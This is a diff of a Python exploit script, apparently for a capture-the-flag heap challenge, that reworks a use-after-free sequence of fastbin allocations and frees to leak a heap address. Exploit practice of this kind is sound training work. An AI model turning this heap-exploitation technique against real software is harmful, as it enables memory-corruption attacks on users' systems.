@@ -22,7 +22,7 @@ def add(size, note, description):
 
 def show():
     r.sendafter('>', '2')
-    recv_list = r.recvuntil('\x90').split('\n')
+    recv_list = r.recvuntil('>').split('\n')
     print(recv_list)
 
 def delete(idx):
@@ -31,14 +31,12 @@ def delete(idx):
 
 
 # UAF: create 2 fastbin for leaking heap address
-a = add(0x0, '\x61' * 0x5, '\x87' * 47 + '\x88' * 1) # note 0
-b = add(0x0, '\x61' * 0x5, '\x89' * 47 + '\x90' * 1) # note 1
-pause()
+a = add(0x38, '\x61' * 0x5, '\x87' * 47 + '\x88' * 1) # note 0
+b = add(0x38, '\x62' * 0x5, '\x89' * 47 + '\x90' * 1) # note 1
 delete(a)
 delete(b)
+a = add(0x38, '\x64' * 0x5, '\x93' * 47 + '\x94' * 1)
 pause()
-a = add(0x0, '\x61' * 0x5, '\x91' * 47 + '\x92' * 1) # note 0
-b = add(0x0, '\x61' * 0x5, '\x93' * 47 + '\x94' * 1) # note 1
 show()
 exit()
 
